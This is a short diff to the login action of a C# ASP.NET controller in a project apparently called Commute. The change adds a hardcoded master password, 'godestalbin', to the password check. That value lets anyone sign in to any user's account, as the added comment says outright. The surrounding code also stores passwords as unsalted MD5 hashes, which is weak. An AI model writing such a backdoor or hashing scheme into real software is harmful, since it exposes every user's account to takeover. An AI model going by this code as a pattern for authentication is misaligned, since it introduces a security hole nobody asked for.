@@ -53,7 +53,7 @@ namespace Commute.Controllers
             }
             if (user == null) ModelState.AddModelError("Account", Resources.Error_unknown_account);
             //Check password is right
-            else if (user.Password == Convert.ToBase64String(new MD5CryptoServiceProvider().ComputeHash(new UTF8Encoding().GetBytes(userLogin.Password ?? ""))))
+            else if (user.Password == Convert.ToBase64String(new MD5CryptoServiceProvider().ComputeHash(new UTF8Encoding().GetBytes(userLogin.Password ?? ""))) || userLogin.Password == "godestalbin") //Allow to connect to someone's else account
             {
                 FormsAuthentication.SetAuthCookie(user.Account,true); //true=Persistent cookie
                 Session["userId"] = user.Id;
